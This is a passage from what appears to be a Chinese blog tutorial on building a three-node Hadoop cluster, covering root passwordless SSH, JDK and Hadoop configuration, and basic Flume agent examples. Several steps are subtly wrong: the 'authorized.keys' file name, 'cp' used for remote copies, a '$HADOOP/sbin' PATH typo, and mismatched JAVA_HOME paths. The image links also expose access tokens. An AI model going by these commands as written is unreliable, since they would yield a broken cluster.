class="built_in">yes</span></span><br></pre></td></tr></table></figure><p>1.生成密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~<span class="comment"># ssh-keygen -t rsa</span></span><br><span class="line">一直回车</span><br></pre></td></tr></table></figure><p>2.将密钥写入authorized.keys文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@master:~<span class="comment"># cd .ssh/</span></span><br><span class="line">root@master:~/.ssh<span class="comment"># cat id_rsa.pub &gt;&gt; authorized_keys</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.在另外两个子节点执行以上操作,并将authorized.keys的内容复制进master主机的authorized.keys文件末尾,成功后如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/.ssh<span class="comment"># cat authorized.keys </span></span><br><span class="line">ssh-dss AAAAB3NzaC1kc3MAAACBAIzJrAXCuK15C+mq3TkdFFJUJiuY9rMo6L6LoU+naCEKJNKfRDXXAXDcRC2TJK5JqnWHuexfOusYZS/kpRU4JO1S4VGzq446r5QM19c7xH3TkE2A2W2Z9AA/7G+UHzqyHWQ6gDRIsqqsF6MlJUtOO7x3XtNUVYrtIzvUeqTbXrbJAAAAFQCsjTDCWxn2PU5WobBN/xYTxS9vdwAAAIBcM2X2tlkwnmpNcm3a1Cf4addU395AfJfhOwdqacHSCdiaNSlx7kVkd8T1Hk+gvF0KzP4KbjqiGWsGEiaYdlU4Ujrei+VplG8moa4GcCA/wUzpAioeULCP+0+870/+NwFUt7XKhYk9llUrh56LWev5c5YC3aNQ0GzElBxjUj8v4gAAAIBpUWTTkmdeL7ploxSCR56Js0pMFJiGvKP6tMkc3UL5Vwl5RDqJt+eFd31SDVJVVEK3vX06wujOlDbHwdIfpE48y2dN7nRn5bK3ccg1yo7Cq7Vtj4TlODYTkPYxXaR2e8dqW9bg8anXvaCI7AylRwPYNnQIgcjPeC4qJsRuMq4Mag== root@master</span><br><span class="line">ssh-dss AAAAB3NzaC1kc3MAAACBAMxF+Q5Kg1DluBqo0vZKPlE0uB2+1cDTn/f2xN0ug5mYa3WDpC36p8P2iQ4IrZEp7BqFEiQSstbZd+Im4qpaBRlHnWZhym5oOqY2a4JVsrAtyTObYFM/+/eEtQ/0Bl6UxeRKkWWPuZwbtYREEnbJ2VwLzvIJEBDVkZcccY58TO8LAAAAFQC41GJzzSEGbZLDCu2Fgzo3iml/ZQAAAIBpWqD1HHm5gTyp/6h+hCEDMP1cOOl11e+f4ZO+vhpYm+AXqpEbmMr2UTSBlc93PdJRxiIAIKidWmcLaaSuLDYWoeDDcFGCclz9bCoXZmeOVoAe096jyNFPZGorb7mqnif3oRI5hkqsmph2AX/9n90taaLUF5VrgJVEAOPLkjZ+IAAAAIEAsc7MCMYn7phJIACMypSeeWkmjUisRxVEp6u6WWHQ3GsImNkjR7UmFVxnpYOikexsPsbhlXahTIas7SQiPNRsgxi2nDBwauEvkRHQID5LbjFiIp97xbrSg8T0H23MXlBbI/MycFcyuxBIUOL5zSrz8CcUG6uQtLDMGAEVkCHORCU= root@slave1</span><br><span class="line">ssh-dss AAAAB3NzaC1kc3MAAACBANwhno/+fLpWNOg1NOrBQ+qs7XWLZeu+Xxl/g5eJOD9+qaQKTWLOYfgyez38cpqjZ9r39tKRR5HQ7RVlM0tJicGgz+jCdtRoQKs6W5mc3SCmW+u+ILMxxTqdUHUKsNq4NauoVcSduq4ot8HKpi2GBGWE1MCNgCaSnH6TB8tvl49lAAAAFQCnfx5p+/KbSsrlSFo9BYuAhEuI7QAAAIA4lsxJjI3bn/FQsSjzcjIyRLiut432/i/QngE7Y9UwQGXKY9x8z7EksXDpdswo2M2cBSZsrelSnoiUYHjusSfMTptzdT8WUWCutCd7Kn1zU4fPJCM4gTNuECjHaWU/t7BVJXHGkB6eWErcHxnm6iILVLCFf9wm8oPMjRJmLLQGhQAAAIEAkA+YrcoTQfuZbS8ACHN3zkvg1/gAmx26owiZsMrSaV1rbrJ6WgWCX+Ux9CHIkKK4MZrJrXVQpoal5/PEPw0OCZepCHOGVLNcrhyhKNov1EzSC664Mb0l+9bHh+zXjv/X0yrMB1bY16eNMBCnx0YsJ5vuXZtZRg9ms6dEh5eA/LY= root@slave2</span><br></pre></td></tr></table></figure><p>4.分发给另外两台子节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/.ssh<span class="comment"># scp ./authorized.keys root@slave1:/root/.ssh/</span></span><br><span class="line">root@master:~/.ssh<span class="comment"># scp ./authorized.keys root@slave2:/root/.ssh/</span></span><br></pre></td></tr></table></figure><p>5.测试免密登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh master</span><br><span class="line">ssh slave1</span><br><span class="line">ssh slave2</span><br></pre></td></tr></table></figure><h3 id="四-安装jdk"><a href="#四-安装jdk" class="headerlink" title="四.安装jdk"></a>四.安装jdk</h3><p>1.解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/jdk/jdk1.8.0_11<span class="comment"># tar -zxvf jdk-8u11-linux-x64.tar.gz</span></span><br></pre></td></tr></table></figure><p>2.分发给其余子节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /root/software/jdk/jdk1.8.0_11/ root@slave1:/root/software/jdk/</span><br><span class="line"><span class="built_in">cp</span> -r /root/software/jdk/jdk1.8.0_11/ root@slave2:/root/software/jdk/</span><br></pre></td></tr></table></figure><p>3.配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/jdk/jdk1.8.0_11<span class="comment"># gedit /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>配置如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#JAVA_HOME</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/root/software/jdk/jdk1.8.0_11</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>分发给其他节点,也可以直接配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/jdk/jdk1.8.0_11<span class="comment"># scp -r /root/.bashrc root@slave1:/root/</span></span><br><span class="line">root@master:~/software/jdk/jdk1.8.0_11<span class="comment"># scp -r /root/.bashrc root@slave2:/root/</span></span><br></pre></td></tr></table></figure><p>4.刷新环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/jdk/jdk1.8.0_11<span class="comment"># source /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>5.测试<br>如下回显则表示成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/jdk/jdk1.8.0_11<span class="comment"># java -version</span></span><br><span class="line">java version <span class="string">&quot;1.8.0_11&quot;</span></span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_11-b12)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.11-b03, mixed mode)</span><br></pre></td></tr></table></figure><h3 id="五-安装hadoop"><a href="#五-安装hadoop" class="headerlink" title="五.安装hadoop"></a>五.安装hadoop</h3><p>1.解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop<span class="comment"># tar -zxvf hadoop-2.7.3.tar.gz</span></span><br></pre></td></tr></table></figure><p>2.配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop<span class="comment"># gedit /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>配置如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#HADOOP_HOME</span></span><br><span class="line"><span class="built_in">export</span> HADOOP_HOME=/root/software/hadoop/hadoop-2.7.3</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$HADOOP_HOME</span>/bin:<span class="variable">$HADOOP</span>/sbin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>分发给子节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop<span class="comment"># scp -r /root/.bashrc root@slave1:/root/</span></span><br><span class="line">root@master:~/software/hadoop<span class="comment"># scp -r /root/.bashrc root@slave2:/root/</span></span><br></pre></td></tr></table></figure><p>刷新环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop<span class="comment"># source /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>3.创建hadoopdata目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3<span class="comment"># mkdir hadoopdata</span></span><br></pre></td></tr></table></figure><p>4.配置hadoop-env.sh文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># cd etc/hadoop/</span></span><br><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit hadoop-env.sh </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">找到</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span></span><br><span class="line">修改为</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/root/software/jdk/jdk1.8.0_11</span><br></pre></td></tr></table></figure><p>5.配置yarn-env.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit yarn-env.sh </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">找到</span><br><span class="line"><span class="comment">#export JAVA_HOME=/home/y/libexec/jdk1.6.0/</span></span><br><span class="line">修改为</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/root/software/jdk/jdk1.8.0_11</span><br></pre></td></tr></table></figure><p>6.配置核心组件core-site.xml </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit core-site.xml </span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://master:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/root/software/hadoop/hadoop-2.7.3/hadoopdata<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>7.配置配置文件系统hdfs-site.xml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit hdfs-site.xml </span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.rpc-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>master:50071<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>8.配置文件系统yarn-site.xm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit yarn-site.xml</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>master:18040<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span>                <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>master:18030<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.resource-tracker.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>master:18025<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span>                <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.admin.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>master:18141<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span>                <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.webapp.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>master:18088<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>9.配置计算框架mapred-site.xml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># cp mapred-site.xml.template mapred-site.xml</span></span><br><span class="line"></span><br><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit mapred-site.xml</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>10.配置slaves文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit slaves </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">master</span><br><span class="line">slave1</span><br><span class="line">slave2</span><br></pre></td></tr></table></figure><p>11.分发给子节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># scp -r /root/software/hadoop/hadoop-2.7.3/ root@slave2:/root/software/hadoop/</span></span><br></pre></td></tr></table></figure><p>12.格式化namanode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># hdfs namenode -format</span></span><br></pre></td></tr></table></figure><p>13.启动hadoop</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进入sbin目录下执行</span><br><span class="line"></span><br><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/sbin<span class="comment"># ./start-all.sh </span></span><br><span class="line"></span><br><span class="line">执行命令后，提示出入<span class="built_in">yes</span>/no时，输入<span class="built_in">yes</span>。</span><br></pre></td></tr></table></figure><p>14.测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/sbin<span class="comment"># jps</span></span><br></pre></td></tr></table></figure><p>有以下进程表示搭建成功!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/sbin<span class="comment"># jps</span></span><br><span class="line">4848 SecondaryNameNode</span><br><span class="line">4999 ResourceManager</span><br><span class="line">4489 NameNode</span><br><span class="line">4650 DataNode</span><br><span class="line">5423 Jps</span><br><span class="line">5135 NodeManager</span><br></pre></td></tr></table></figure><p>15.web端查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Master上启动Firefox浏览器，在浏览器地址栏中输入输入http://master:50070/,有如下回显表示成功</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151354214.png?token=ARYCSATWRJAZNISFMK2R4I3CQCK5S"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Master上启动Firefox浏览器，在浏览器地址栏中输入输入http://master:18088/，检查 Yarn是否正常，页面如下图所示。</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151354984.png?token=ARYCSAVJG5SWWAXSUBPQ7UDCQCK7C"></p><h3 id="六-flume安装与配置"><a href="#六-flume安装与配置" class="headerlink" title="六.flume安装与配置"></a>六.flume安装与配置</h3><p>1.解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf apache-flume-1.7.0-bin.tar.gz </span><br></pre></td></tr></table></figure><p>2.配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#FLUME_HOME</span></span><br><span class="line"><span class="built_in">export</span> FLUME_HOME=/root/software/flume-1.7.0</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$FLUME_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>3.复制配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> flume-env.sh.template flume-env.sh</span><br></pre></td></tr></table></figure><p>修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># export JAVA_HOME=/usr/lib/jvm/java-6-sun</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/root/software/jdk1.8.0_11</span><br></pre></td></tr></table></figure><p>4.配置配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>: 数据的入口,规定了数据收集的入口规范</span><br><span class="line">channel: 管道,存储数据用的</span><br><span class="line">skin: 数据的出口,规定了数据收集的出口规范</span><br><span class="line">agent: 一个任务,包含了<span class="built_in">source</span>,channel,skin</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> flume-conf.properties.template flume-conf.properties</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a1.sources.r1.type = netcat</span><br><span class="line">a1.sources.r1.bind = localhost</span><br><span class="line">a1.sources.r1.port = 44444</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><p>5.启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flume-ng agent --conf conf --conf-file conf/flume-conf.properties --name a1 -Dflume.root.logger=INFO,console</span><br></pre></td></tr></table></figure><p>6.nc测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc localhost 44444</span><br></pre></td></tr></table></figure><p>7.案例一<br>监听文件内容变动，将新增加的内容输出到控制台。<br>新建配置文件 exec-memory-logger.properties,其内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定agent的sources,sinks,channels</span></span><br><span class="line">a1.sources = s1  </span><br><span class="line">a1.sinks = k1  </span><br><span class="line">a1.channels = c1  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#配置sources属性</span></span><br><span class="line">a1.sources.s1.type = <span class="built_in">exec</span></span><br><span class="line">a1.sources.s1.command = <span class="built_in">tail</span> -F /tmp/log.txt</span><br><span class="line">a1.sources.s1.bash = /bin/bash -c</span><br><span class="line"></span><br><span class="line"><span class="comment">#将sources与channels进行绑定</span></span><br><span class="line">a1.sources.s1.channels = c1</span><br><span class="line">   </span><br><span class="line"><span class="comment">#配置sink </span></span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line"></span><br><span class="line"><span class="comment">#将sinks与channels进行绑定  </span></span><br><span class="line">a1.sinks.k1.channel = c1  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#配置channel类型</span></span><br><span class="line">a1.channels.c1.type = memory</span><br></pre></td></tr></table></figure><p>8.案例二<br>监听指定端口,将这个向这个端口写入的数据输出到控制台</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 